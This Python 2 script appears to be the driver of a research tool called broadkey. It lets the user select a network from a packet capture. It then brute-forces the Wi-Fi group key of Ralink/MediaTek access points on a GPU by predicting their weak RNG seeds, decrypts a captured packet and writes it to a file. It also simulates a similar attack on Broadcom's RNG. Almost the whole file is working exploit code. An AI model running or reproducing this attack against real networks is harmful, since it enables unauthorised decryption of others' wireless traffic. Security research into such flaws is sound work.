#!/usr/bin/env python2
import sys, os, math, time, struct

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

if 'build' not in sys.path:
	builddir = os.path.normpath(os.path.join(os.path.dirname(os.path.abspath(__file__)), '../build'))
	sys.path.append(builddir)

import broadkey

# ----------------------------------------- Utility Functions -----------------------------------------

def get_opencl_path():
	path = os.path.dirname(os.path.realpath(__file__))
	return os.path.join(path, "../broadkey/opencl/") 

def open_cl(fname, attributes):
	path = os.path.dirname(os.path.realpath(__file__))
	return open(os.path.join(get_opencl_path(), fname), attributes)

def macaddr2str(macaddr):
    return ':'.join('%02X' % ord(byte) for byte in macaddr)
def list2hex(l):
	return [hex(b) for b in l]
def list2buf(l, little=False):
	buf = ""
	for b in l:
		buf += struct.pack("<I" if little else ">I", b)
	return buf
def buf2str(buf):
	string = ""
	for b in buf:
		string += "\\x%02x" % ord(b)
	return string

def test_crypto():
	broadkey.rl_test_crypto()

def test_gpu_aes():
	import pyopencl as cl
	import numpy

	# Prepare context and command queue
	ctx = cl.create_some_context(interactive=False)
	queue = cl.CommandQueue(ctx)

	print "Compiling kernel ..."
	with open_cl("ralink.cl", "r") as fp:
		code = fp.read() % { 'STARTTIME': 0, 'MACADDR1': 0, 'MACADDR2': 0,
				'NONCE1': 0, 'NONCE2': 0, 'NONCE3': 0, 'NONCE4': 0,
				'KEYSTREAM1': 0, 'KEYSTREAM2': 0,}
		program = cl.Program(ctx, code).build(options="-I %s" % get_opencl_path())

	# Prepare memory
	result = numpy.zeros(shape=(8), dtype=numpy.uint32)
	result[0] = 0xffffffff;
	result[1] = 0xffffffff;
	dest_buf = cl.Buffer(ctx, cl.mem_flags.WRITE_ONLY| cl.mem_flags.COPY_HOST_PTR, hostbuf=result)

	# Run the program
	print "Running kernel ..."
	program.test_aes(queue, (1,), None, dest_buf)

	# Read the result
	cl.enqueue_read_buffer(queue, dest_buf, result).wait()
	print list2hex(result)
	assert result[0] == 0xD4E415CB
	assert result[1] == 0xD038A82B
	assert result[2] == 0x10A673DE
	assert result[3] == 0xEA25B206


# ---------------------------------- Capture Traffic & Search GTK --------------------------------------

def has_key(gmks, expectedgmk):
	parsed = struct.unpack(">IIIIIIII", expectedgmk)
	for gmk in gmks:
		if all(gmk == parsed):
			return True
	return False

def predict_gtk_jiffies(startJiffies, tsf):
	INTERVAL_JIFFIES = 900261

	# Calculate uptime in seconds and hours
	uptimesec = tsf / 1e6
	uptimehrs = int(math.floor(uptimesec / 3600))

	# Every hour a new gnonce is generated
	prediction = (startJiffies + uptimehrs * INTERVAL_JIFFIES) % 2**32
	return prediction

def ralink_gpu_search(bssid, nonce, keystream, gmkJiffies, gtkJiffies):
	KEYSTREAM_WORDS = 100 * 4
	# FIXME: Set this parameter dynamically based on uptime of router (longer uptime
	#        means bigger range has to be checked.
	JIFFIES_RANGE = 45000
	import pyopencl as cl
	import numpy

	# Generate all 32 keys for *each* initial jiffy value
	print "[+] Generating GMK list on CPU ..."
	gmks = broadkey.rl_generate_keys(bssid, gmkJiffies, 10)

	# Prepare context and command queue
	ctx = cl.create_some_context(interactive=False)
	queue = cl.CommandQueue(ctx)

	print "[+] Reading and compiling GPU kernel ..."
	with open_cl("ralink.cl", "r") as fp:
		macaddr1, macaddr2     = struct.unpack(">II", bssid + "\x00\x00")
		n1, n2, n3, n4         = struct.unpack("<IIII", nonce)
		keystream1, keystream2 = struct.unpack("<II", keystream)
		code = fp.read() % {
			'STARTTIME': gtkJiffies - JIFFIES_RANGE/2,
			'MACADDR1': macaddr1,
			'MACADDR2': macaddr2,
			'NONCE1': n1,
			'NONCE2': n2,
			'NONCE3': n3,
			'NONCE4': n4,
			'KEYSTREAM1': keystream1,
			'KEYSTREAM2': keystream2,
		}
		program = cl.Program(ctx, code).build(options="-I %s" % get_opencl_path())

	# Prepare memory: 8 integers for the GTK if found, 1 integer to denote GMK found, 1 integer to denote GNONCE found, 1 integer to denote GNONCE incpos
	result = numpy.zeros(shape=(11 + KEYSTREAM_WORDS), dtype=numpy.uint32)
	result[0] = 0xffffffff;
	result[1] = 0xffffffff;
	gmks_buf = cl.Buffer(ctx, cl.mem_flags.READ_ONLY | cl.mem_flags.COPY_HOST_PTR, hostbuf=gmks)
	dest_buf = cl.Buffer(ctx, cl.mem_flags.WRITE_ONLY| cl.mem_flags.COPY_HOST_PTR, hostbuf=result)

	# Run the program -- this order of dimensions about 7% faster than the reverse
	print "[+] Starting GNONCE/GTK search on GPU ..."
	program.search_gtk(queue, (JIFFIES_RANGE, len(gmks)), None, gmks_buf, dest_buf)

	# Read the result
	cl.enqueue_read_buffer(queue, dest_buf, result).wait()

	if result[0] != 0xffffffff and result[1] != 0xffffffff:
		gtk, gmkid, gnonceDelta, gnonceIncpos = result[:8], result[8], result[9], result[10]
		jiffies_gmk    = (gmkJiffies + gmkid / 32) % 2**32
		jiffies_gnonce = (gtkJiffies - JIFFIES_RANGE/2 + gnonceDelta) % 2**32
		print "[+] GMK jiffies:", jiffies_gmk, "increment pos", gmkid % 32
		print "    GNonce jiffies:", jiffies_gnonce, "with increment pos", gnonceIncpos, "so delta was", gnonceDelta
		morekeystream = list2buf(result[11:11+KEYSTREAM_WORDS], little=True)
		return gtk, morekeystream

	return None


def ralink_broadkey_prediction(fname, expected_jiffies_gmk=None, expected_jiffies_gnonce=None):
	#print "TODO: Check that beacon contains Ralink or MediaTek information elements"

	# 1. Show the SSIDs that are present in the capture
	ssidlist = list(broadkey.rl_get_ssids(fname))
	if len(ssidlist) == 0:
		print "No access points found in capture"
		return

	print "\n[ ] Select target network:\n"
	print "    %s   %-20s %s" % ("Index", "SSID", "BSSID")
	print "    %s   %-20s %s" % ("-----", "----", "-----")
	for idx in range(len(ssidlist)):
		ssid, bssid = ssidlist[idx]
		print "    %4d)   %-20s %s" % (idx + 1, ssid, macaddr2str(bssid))

	# 2. Let the user enter network to attack
	try:
		print "\n    Enter index:",
		index = int(raw_input()) - 1
		if index < 0 or index >= len(ssidlist):
			print "Index outside bounds"
			return
		print ""
	except ValueError:
		print "You did not enter a value number"
		return

	# 3. Extract hash for the selected SSIDs
	ssid, bssid = ssidlist[index]
	tsf, enctype, nonce, keystream, packet = broadkey.rl_extract_hash(fname, bssid)

	# 4. Predict the jiffies that were used
	gmkJiffies = 4294894407 if enctype == 1 else 4294894229 # Jiffies are different depending on AES or TKIP cipher
	gtkJiffies = predict_gtk_jiffies(gmkJiffies + 20, tsf)
	print "[ ] Predicted jiffies GMK   : ~%d" % gmkJiffies
	print "[ ] Predicted jiffies GNONCE: ~%d" % gtkJiffies

	# 5. Brutefoce GTK based on the hash
	start = time.time()
	gtk, keystream = ralink_gpu_search(bssid, nonce, keystream, gmkJiffies, gtkJiffies)
	end = time.time()
	if gtk is None:
		print "[-] Failed to find GTK"
	else:
		gtkbuf = buf2str(list2buf(gtk))
		print "[+] Found GTK:", gtkbuf, "\n"

		# Decrypt and print captured packet
		decrypted = packet[:32]
		for pt, kt in zip(packet[32:], keystream):
			decrypted += chr(ord(pt) ^ ord(kt))
		broadkey.dump_packet(decrypted)

		wrpcap("decrypted.pcap", [Dot11(type=2, subtype=0)/Raw(decrypted[32:])])
		print "[+] Wrote decrypted packet to decrypted.pcap"

	print "\nExecution time:", end - start, "seconds"


# ---------------------------------------- Broadcom ----------------------------------------------

def bcom_test():
	broadkey.bcom_test_crypto()

def increase_gnonce(gnonce):
	i = len(gnonce) - 1
	gnonce[i] += 1
	while gnonce[i] == 0x100 and i >= 0:
		gnonce[i] = 0
		i -= 1
		gnonce[i] += 1

def macaddr_gnonce_data(macaddr, gnonce):
	"""Return binary encoding of `macaddr || GNONCE` in groups of 32-bit words"""
	data = macaddr + "".join([chr(byte) for byte in gnonce]) + "\x00\x00"
	return ", ".join(list2hex(struct.unpack(">" + "I" * 10, data)))


def bcom_hash():
	"""
	Simulate an attack against Broadcom random number generator, to estimate the time
	needed to break their RNG in practice.
	"""
	import pyopencl as cl
	import numpy

	gmk_secs   = 0x5738C418
	gmk_usecs  = 0x0007625E
	keystream1 = 0x6bfa4c68
	keystream2 = 0xcf1876c3L

	# Search space parameters
	num_gnonces = 8         # Number of gnonce to check (= how many times key_counter was incremented after being used as gnonce)
	time_range  = 10000 # 500000    # Number of microseconds to search around the guessed boot-up time (to determine the GTK).
	                        # We have to link the time in beacons to the boot-up time, may be tedious. And we have to take
	                        # into account any skew on the timer in the beacons that throw this prediction off.
	macaddr     = "\x01\x02\x03\x04\x05\x06"
	gnonce      = range(32)

	# Prepare context and command queue
	ctx = cl.create_some_context(interactive=False)
	queue = cl.CommandQueue(ctx)

	# Prepare memory
	result = numpy.zeros(shape=(16), dtype=numpy.uint32)
	result[0] = 0xffffffff;
	result[1] = 0xffffffff;
	dest_buf = cl.Buffer(ctx, cl.mem_flags.WRITE_ONLY| cl.mem_flags.COPY_HOST_PTR, hostbuf=result)

	# Prepare code
	with open_cl("broadcom.cl", "r") as fp:
		template = fp.read()

	for gnonce_offset in range(num_gnonces):
		# Read and compile the program
		print "[ ] Compiling program ..."
		code = template % {
			'DATA': macaddr_gnonce_data(macaddr, gnonce),
			'SECONDS': gmk_secs,
			'MICROSECONDS': gmk_usecs,
			'NONCE1': 0x2C380001,
			'NONCE2': 0xBC69C14A,
			'NONCE3': 0x00000000,
			'NONCE4': 0x0100B800,
			'KEYSTREAM1': keystream1,
			'KEYSTREAM2': keystream2
		}
		program = cl.Program(ctx, code).build(options="-I %s" % get_opencl_path())

		# 500000 with 2ms next call takes about 30 seconds. This is an initial cost, and using
		# more higher end (desktop) GPUs this would also be significantly faster.
		print "    Running program ..."
		program.search_gtk(queue, (time_range,), None, dest_buf)
		
		# Read the result and check if the key was found
		cl.enqueue_read_buffer(queue, dest_buf, result).wait()
		if result[0] != 0xffffffff and result[1] != 0xffffffff:
			break

		increase_gnonce(gnonce)
	
	print list2hex(result)


# ---------------------------------------- Main ----------------------------------------------

def main():
	if len(sys.argv) <= 1:
		print "Usage:", sys.argv[0], "test|ralink|broadcom"
		quit(1)

	if sys.argv[1] == "test":
		test_crypto()
		test_gpu_aes()
		print "All tests completed"
	elif sys.argv[1] == "mediatek":
		if len(sys.argv) <= 2:
			print "Usage:", sys.argv[0], "ralink capture-file.pcap"
			quit()
		ralink_broadkey_prediction(sys.argv[2])
	elif sys.argv[1] == "broadcom":
		bcom_test()
		bcom_hash()
	else:
		print "Unknown command", sys.argv[1]
		quit()


if __name__ == "__main__":
	main()

